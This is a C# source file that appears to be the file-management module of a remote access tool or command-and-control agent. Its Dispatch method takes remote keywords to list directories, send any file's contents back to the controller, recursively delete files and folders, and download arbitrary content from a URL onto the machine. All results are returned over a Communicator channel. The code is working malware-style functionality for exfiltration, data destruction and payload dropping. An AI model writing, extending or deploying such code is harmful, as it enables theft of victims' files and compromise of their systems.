using System;
using System.IO;
using System.Text;
using System.Threading.Tasks;
using True.Core;
using System.Linq;
using System.Security.AccessControl;
using System.Security.Principal;
using System.Security.Cryptography;
using System.Net.Http;

namespace True.Features
{
    public static class FileExplorer
    {
        private static string SanitizePath(string path)
        {
            return path?.Trim().Trim('"');
        }

        public static async Task Explore(string path)
        {
            Logger.Info("FileExplorer", $"Exploring path: {path}");
            path = SanitizePath(path);

            if (string.IsNullOrWhiteSpace(path) || !Directory.Exists(path))
            {
                await Communicator.PostResponse("explore", $"Invalid directory: {path}");
                return;
            }

            StringBuilder result = new StringBuilder();

            try
            {
                var dirs = Directory.GetDirectories(path);
                foreach (var dir in dirs)
                    result.AppendLine("[DIR] " + Path.GetFileName(dir));

                var files = Directory.GetFiles(path);
                foreach (var file in files)
                    result.AppendLine("[FILE] " + Path.GetFileName(file));

                if (result.Length == 0)
                    result.AppendLine("[Empty directory]");

                await Communicator.PostResponse("explore", result.ToString().Trim());
            }
            catch (Exception ex)
            {
                Logger.Error("FileExplorer", $"Failed to explore path: {ex.Message}");
                await Communicator.PostResponse("explore", $"Error reading directory: {ex.Message}");
            }
        }

        public static async Task Download(string path)
        {
            path = SanitizePath(path);
            Logger.Info("FileExplorer", $"Downloading file: {path}");

            try
            {
                if (!File.Exists(path))
                {
                    Logger.Warn("FileExplorer", $"File does not exist: {path}");
                    await Communicator.PostResponse("download", $"ERROR: File not found → {path}");
                    return;
                }

                byte[] data = await File.ReadAllBytesAsync(path);
                string filename = Path.GetFileName(path);

                Communicator.PostFile("download", data, filename);
            }
            catch (Exception ex)
            {
                Logger.Error("FileExplorer", $"Download failed: {ex.Message}");
                await Communicator.PostResponse("download", $"ERROR: {ex.Message}");
            }
        }

        public static async Task Delete(string path)
        {
            path = SanitizePath(path);
            Logger.Info("FileExplorer", $"Deleting file: {path}");

            try
            {
                if (File.Exists(path))
                {
                    File.Delete(path);
                    await Communicator.PostResponse("delete", $"File deleted: {path}");
                }
                else if (Directory.Exists(path))
                {
                    Directory.Delete(path, recursive: true);
                    await Communicator.PostResponse("delete", $"Directory deleted: {path}");
                }
                else
                {
                    Logger.Warn("FileExplorer", $"Target not found: {path}");
                    await Communicator.PostResponse("delete", $"ERROR: Not found: {path}");
                }
            }
            catch (Exception ex)
            {
                Logger.Error("FileExplorer", $"Delete failed: {ex.Message}");
                await Communicator.PostResponse("delete", $"ERROR: {ex.Message}");
            }
        }

        public static async Task Rename(string args)
        {
            Logger.Info("FileExplorer", $"Renaming: {args}");

            try
            {
                var parts = args.Split('|');
                if (parts.Length != 2)
                {
                    await Communicator.PostResponse("rename", "ERROR: Invalid format. Use: old|new");
                    return;
                }

                string oldPath = SanitizePath(parts[0]);
                string newPath = SanitizePath(parts[1]);

                if (!File.Exists(oldPath) && !Directory.Exists(oldPath))
                {
                    await Communicator.PostResponse("rename", $"ERROR: Source not found: {oldPath}");
                    return;
                }

                if (File.Exists(oldPath))
                    File.Move(oldPath, newPath);
                else
                    Directory.Move(oldPath, newPath);

                await Communicator.PostResponse("rename", $"Renamed to: {newPath}");
            }
            catch (Exception ex)
            {
                Logger.Error("FileExplorer", $"Rename failed: {ex.Message}");
                await Communicator.PostResponse("rename", $"ERROR: {ex.Message}");
            }
        }

        public static async Task Upload(string args)
        {
            Logger.Info("FileExplorer", $"Uploading from URL: {args}");

            try
            {
                var parts = args.Split('|');
                if (parts.Length != 2)
                {
                    await Communicator.PostResponse("upload", "ERROR: Use format: <url>|<target_path>");
                    return;
                }

                string fileUrl = parts[0];
                string targetPath = SanitizePath(parts[1]);

                string[] protectedPaths = new[]
                {
                    Environment.GetFolderPath(Environment.SpecialFolder.Windows),
                    Environment.GetFolderPath(Environment.SpecialFolder.ProgramFiles),
                    Environment.GetFolderPath(Environment.SpecialFolder.System),
                };

                if (protectedPaths.Any(p => targetPath.StartsWith(p, StringComparison.OrdinalIgnoreCase)))
                {
                    await Communicator.PostResponse("upload", "ERROR: Cannot write to protected system directories.");
                    return;
                }

                string directory = Path.GetDirectoryName(targetPath);
                if (!Directory.Exists(directory))
                {
                    Directory.CreateDirectory(directory);
                }

                using var client = new HttpClient();
                var fileBytes = await client.GetByteArrayAsync(fileUrl);
                await File.WriteAllBytesAsync(targetPath, fileBytes);

                await Communicator.PostResponse("upload", $"Downloaded from {fileUrl} to {targetPath}");
            }
            catch (Exception ex)
            {
                Logger.Error("FileExplorer", $"Upload failed: {ex.Message}");
                await Communicator.PostResponse("upload", $"ERROR: {ex.Message}");
            }
        }

        public static async Task Stat(string path)
        {
            path = SanitizePath(path);
            Logger.Info("FileExplorer", $"Getting stats for: {path}");

            try
            {
                var sb = new StringBuilder();

                if (File.Exists(path))
                {
                    var info = new FileInfo(path);
                    var security = info.GetAccessControl();
                    var owner = security.GetOwner(typeof(NTAccount));
                    var sha256 = ComputeSHA256(path);

                    sb.AppendLine($"[FILE] {info.Name}");
                    sb.AppendLine($"Full Path: {info.FullName}");
                    sb.AppendLine($"Extension: {info.Extension}");
                    sb.AppendLine($"Size: {info.Length} bytes");
                    sb.AppendLine($"Created: {info.CreationTime}");
                    sb.AppendLine($"Modified: {info.LastWriteTime}");
                    sb.AppendLine($"Accessed: {info.LastAccessTime}");
                    sb.AppendLine($"Attributes: {info.Attributes}");
                    sb.AppendLine($"Owner: {owner}");
                    sb.AppendLine($"SHA256: {sha256}");
                }
                else if (Directory.Exists(path))
                {
                    var info = new DirectoryInfo(path);
                    var files = info.GetFiles("*", SearchOption.AllDirectories);
                    long totalSize = files.Sum(f => f.Length);
                    var owner = info.GetAccessControl().GetOwner(typeof(NTAccount));

                    sb.AppendLine($"[DIRECTORY] {info.Name}");
                    sb.AppendLine($"Full Path: {info.FullName}");
                    sb.AppendLine($"Created: {info.CreationTime}");
                    sb.AppendLine($"Modified: {info.LastWriteTime}");
                    sb.AppendLine($"Attributes: {info.Attributes}");
                    sb.AppendLine($"Owner: {owner}");
                    sb.AppendLine($"Files: {files.Length}");
                    sb.AppendLine($"Total Size: {totalSize} bytes");
                }
                else
                {
                    await Communicator.PostResponse("stat", $"ERROR: Path does not exist: {path}");
                    return;
                }

                await Communicator.PostResponse("stat", sb.ToString().Trim());
            }
            catch (Exception ex)
            {
                Logger.Error("FileExplorer", $"Stat failed: {ex.Message}");
                await Communicator.PostResponse("stat", $"ERROR: {ex.Message}");
            }
        }

        private static string ComputeSHA256(string filePath)
        {
            try
            {
                using var sha256 = SHA256.Create();
                using var stream = File.OpenRead(filePath);
                byte[] hash = sha256.ComputeHash(stream);
                return BitConverter.ToString(hash).Replace("-", "").ToLowerInvariant();
            }
            catch
            {
                return "N/A";
            }
        }

        public static async Task Dispatch(string keyword, string args)
        {
            switch (keyword)
            {
                case "explore":
                    await Explore(args);
                    break;
                case "download":
                    await Download(args);
                    break;
                case "delete":
                    await Delete(args);
                    break;
                case "rename":
                    await Rename(args);
                    break;
                case "upload":
                    await Upload(args);
                    break;
                case "stat":
                    await Stat(args);
                    break;
                default:
                    Logger.Warn("FileExplorer", $"Unknown subcommand: {keyword}");
                    break;
            }
        }
    }
}
